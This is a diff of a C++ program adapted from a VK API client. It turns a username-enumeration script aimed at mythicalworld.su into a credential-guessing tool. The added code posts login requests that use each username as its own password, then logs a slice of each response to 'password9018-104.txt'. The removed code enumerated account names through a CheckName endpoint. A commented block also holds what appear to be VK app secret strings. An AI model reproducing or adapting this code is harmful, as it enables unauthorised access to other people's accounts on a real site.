@@ -48,13 +48,24 @@
 using ::std::string;
 using json = ::nlohmann::json;
 using namespace std;
-const string VK::Client::api_url = "https://mythicalworld.su/ajax.php";//стандартный путь 
+const string VK::Client::api_url = "https://mythicalworld.su/";//стандартный путь 
 /*const string VK::Client::app_id = "3140623";// android=2274003
 const string VK::Client::app_secret = "VeWdmVclDCtn6ihuP1nt";// android=hHbZxrka2uZ6jB1inYsH*/
 
 //Конструктор
 VK::Client::Client(){ }
-
+/*
+int print_time() {
+	ofstream fout("log.txt", ios_base::app);
+	if (!fout.is_open()) {
+		cout << "укепроьваипртоьлбдж";
+		return 0;
+	}
+	SYSTEMTIME st;
+	GetLocalTime(&st);
+	fout << "|" << st.wYear << "|" << st.wMonth << "|" << st.wDay << "|	" << st.wHour << "|" << st.wMinute << "|	" << st.wSecond << "|	" << st.wMilliseconds << "|	" << "id:	" << this_thread::get_id() << endl;
+	fout.close();
+};*/
 size_t counter(const string& s)
 {
 	set<char> c(s.begin(), s.end());
@@ -62,12 +73,22 @@ size_t counter(const string& s)
 }
 //функуция обработки методов
 json VK::Client::call(const string &name) {
-		string params = "do=CheckName&name="+name+"&";
-
-		if (request(api_url, params).length()==190) {
-			ofstream fout("user.txt", ios_base::app);
-			fout << name +"\n";
+	setlocale(LC_ALL, "Russian");
+		string params = "login_name=" + name + "&login_password=" + name + "&login=submit&";
+		try{
+		//if (request(api_url, params).length()==190) {
+			ofstream fout("password9018-104.txt", ios_base::app);
+			//fout << name +"\n";
+			string rez = request(api_url, params).erase(0, 9018);
+			string reze = rez.erase(104);
+			fout << name +"|"+ reze +"\n";
+			cout << name + "|" + reze + "\n";
 			fout.close();
+			//print_time();
+		//}
+		}
+		catch (...) {
+			cout << "eeeeeeeeeeeerrrrrr\n";
 		}
 		//cout << "" + params + "\n";
 		return nullptr;
